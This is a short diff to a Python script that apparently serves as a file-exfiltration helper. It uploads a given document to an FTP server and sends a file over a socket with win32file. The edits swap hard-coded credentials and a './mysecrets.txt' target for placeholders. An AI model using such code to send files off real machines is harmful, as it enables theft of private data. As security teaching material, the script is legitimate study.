@@ -7,12 +7,17 @@ import os
 import socket
 import win32file
 
+
 def plain_ftp(docpath, server='127.0.0.1'):
+    '''
+    Just normal FTP.
+    '''
     ftp = ftplib.FTP(server)
-    ftp.login("anonymous", "anon@example.com")  # Login to a FTP server
-    ftp.cwd('/pub/')
+    ftp.login("<Username here!>", "<Email here!>")  # Login to a FTP server
+    ftp.cwd('/pub/')  # Change to another directory
     ftp.storbinary("STOR " + os.path.basename(docpath), open(docpath, "rb"), 1024)
-    ftp.quit()
+    ftp.quit()  # Quit the server
+
 
 def transmit(document_path):
     '''
@@ -26,6 +31,6 @@ def transmit(document_path):
             win32file._get_osfhandle(f.fileno()),
             0, 0, None, 0, b'', b'')
 
-# Execute
+
 if __name__ == '__main__':
-    transmit('./mysecrets.txt')
+    transmit('<File to transmit here!>')
